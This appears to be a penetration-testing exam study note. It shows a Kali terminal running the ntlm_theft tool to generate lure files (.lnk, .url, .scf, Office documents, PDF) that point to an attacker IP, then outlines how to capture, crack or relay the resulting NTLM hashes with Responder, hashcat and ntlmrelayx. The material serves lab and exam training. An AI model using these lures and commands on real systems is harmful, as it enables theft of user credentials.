```
git clone https://github.com/Greenwolf/ntlm_theft
Cloning into 'ntlm_theft'...
remote: Enumerating objects: 151, done.
remote: Counting objects: 100% (38/38), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 151 (delta 31), reused 24 (delta 24), pack-reused 113 (from 1)
Receiving objects: 100% (151/151), 2.12 MiB | 1.77 MiB/s, done.
Resolving deltas: 100% (73/73), done.
                                                                                                                                                    
┌──(lanc3㉿kali)-[~]
└─$ cd ntlm_theft                                  
                                                                                                                                                    
┌──(lanc3㉿kali)-[~/ntlm_theft]
└─$ python3 ntlm_theft.py --generate all --server 10.10.14.67 --filename lanc3-ntlm
/home/lanc3/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: lanc3-ntlm/lanc3-ntlm.scf (BROWSE TO FOLDER)
Created: lanc3-ntlm/lanc3-ntlm-(url).url (BROWSE TO FOLDER)
Created: lanc3-ntlm/lanc3-ntlm-(icon).url (BROWSE TO FOLDER)
Created: lanc3-ntlm/lanc3-ntlm.lnk (BROWSE TO FOLDER)
Created: lanc3-ntlm/lanc3-ntlm.rtf (OPEN)
Created: lanc3-ntlm/lanc3-ntlm-(stylesheet).xml (OPEN)
Created: lanc3-ntlm/lanc3-ntlm-(fulldocx).xml (OPEN)
Created: lanc3-ntlm/lanc3-ntlm.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: lanc3-ntlm/lanc3-ntlm-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: lanc3-ntlm/lanc3-ntlm-(includepicture).docx (OPEN)
Created: lanc3-ntlm/lanc3-ntlm-(remotetemplate).docx (OPEN)
Created: lanc3-ntlm/lanc3-ntlm-(frameset).docx (OPEN)
Created: lanc3-ntlm/lanc3-ntlm-(externalcell).xlsx (OPEN)
Created: lanc3-ntlm/lanc3-ntlm.wax (OPEN)
Created: lanc3-ntlm/lanc3-ntlm.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: lanc3-ntlm/lanc3-ntlm.asx (OPEN)
Created: lanc3-ntlm/lanc3-ntlm.jnlp (OPEN)
Created: lanc3-ntlm/lanc3-ntlm.application (DOWNLOAD AND OPEN)
Created: lanc3-ntlm/lanc3-ntlm.pdf (OPEN AND ALLOW)
Created: lanc3-ntlm/zoom-attack-instructions.txt (PASTE TO CHAT)

```
see notes on Flight lab in hackthebox to see how this is used

------

`ntlm_theft` is a great utility for generating various files (like `.url`, `.lnk`, or `.scf`) to force NTLM authentication, the exam is more about knowing _when_ and _where_ to use these triggers.

### What You Should Focus On

Instead of memorizing the tool's syntax, know these:

- **Coerced Authentication:** Understand how to force a victim machine or service to authenticate to your Kali machine. This is the "why" behind the tool.
 
- **Responder Integration:**  know how to set up `Responder` or `impacket-smbserver` to catch the hashes once you’ve used a tool like `ntlm_theft` to "hook" a victim.

- **File Upload Vulnerabilities:** In exam, if you find a way to upload a file to a share or a web portal, knowing how to craft a simple `.lnk` or `.url` file to capture a hash is a high-value skill.
 
- **NTLMv2 Cracking:** Once you capture the hash via the "theft" method, crack using `hashcat` or `John the Ripper` using the standard `rockyou.txt` wordlist.
 

You can actually achieve everything `ntlm_theft` does manually or with simple one-liners. :

Usually, exam requires you to find an initial foothold. `ntlm_theft` is more of a "post-foothold" or "lateral movement" tactic if you have access to a writeable SMB share.


### Practical Checklist for Your Labs:

- Can you create a basic `.url` file that points an icon path to your IP?

- Do you know how to use `Responder` with the `--analyze` flag first to see if there is existing traffic?

- Are you comfortable with `impacket-ntlmrelayx` if you decide to relay the hash instead of cracking it? (Note: Relaying is a core AD skill for exam).


**Summary:** Keep the tool in your "cheat sheet," but spend more time practicing the **Responder + SMB Share** workflow.